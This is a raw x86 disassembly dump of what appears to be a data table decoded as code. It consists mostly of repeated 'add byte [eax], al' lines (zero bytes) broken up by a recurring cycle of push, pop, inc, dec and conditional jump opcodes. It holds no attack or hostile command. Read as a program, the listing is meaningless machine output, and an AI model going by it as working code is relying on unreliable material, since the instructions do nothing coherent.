add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
bound eax, qword [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
arpl word [eax], ax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte fs:[eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
imul eax, dword [eax], 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
outsb dx, byte [esi]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jo 0x809d67a
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jno 0x809d686
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jb 0x809d692
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jae 0x809d69e
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
je 0x809d6aa
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jne 0x809d6b6
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jbe 0x809d6c2
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
ja 0x809d6ce
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
js 0x809d6da
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jns 0x809d6e6
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jp 0x809d6f2
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc ecx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc ebx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec esp
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push esp
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
bound eax, qword [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
arpl word [eax], ax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte fs:[eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
imul eax, dword [eax], 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
outsb dx, byte [esi]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jo 0x809d8ea
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jno 0x809d8f6
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jb 0x809d902
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jae 0x809d90e
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
je 0x809d91a
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jne 0x809d926
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jbe 0x809d932
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
ja 0x809d93e
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
js 0x809d94a
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jns 0x809d956
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jp 0x809d962
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc ecx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc ebx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec esp
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push esp
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
bound eax, qword [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
arpl word [eax], ax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte fs:[eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
imul eax, dword [eax], 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
outsb dx, byte [esi]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jo 0x809db5a
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jno 0x809db66
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jb 0x809db72
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jae 0x809db7e
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
je 0x809db8a
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jne 0x809db96
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jbe 0x809dba2
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
ja 0x809dbae
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
js 0x809dbba
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jns 0x809dbc6
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jp 0x809dbd2
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc ecx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc ebx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec esp
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push esp
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
bound eax, qword [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
arpl word [eax], ax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte fs:[eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
imul eax, dword [eax], 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
outsb dx, byte [esi]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jo 0x809ddca
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jno 0x809ddd6
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jb 0x809dde2
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jae 0x809ddee
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
je 0x809ddfa
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jne 0x809de06
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jbe 0x809de12
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
ja 0x809de1e
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
js 0x809de2a
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jns 0x809de36
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jp 0x809de42
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc ecx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc ebx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec esp
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push esp
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
bound eax, qword [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
arpl word [eax], ax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte fs:[eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
imul eax, dword [eax], 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
outsb dx, byte [esi]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jo 0x809e03a
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jno 0x809e046
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jb 0x809e052
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jae 0x809e05e
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
je 0x809e06a
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jne 0x809e076
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jbe 0x809e082
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
ja 0x809e08e
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
js 0x809e09a
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jns 0x809e0a6
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jp 0x809e0b2
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc ecx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc ebx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec esp
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push esp
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
bound eax, qword [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
arpl word [eax], ax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte fs:[eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
imul eax, dword [eax], 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
outsb dx, byte [esi]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jo 0x809e2aa
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jno 0x809e2b6
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jb 0x809e2c2
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jae 0x809e2ce
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
je 0x809e2da
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jne 0x809e2e6
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
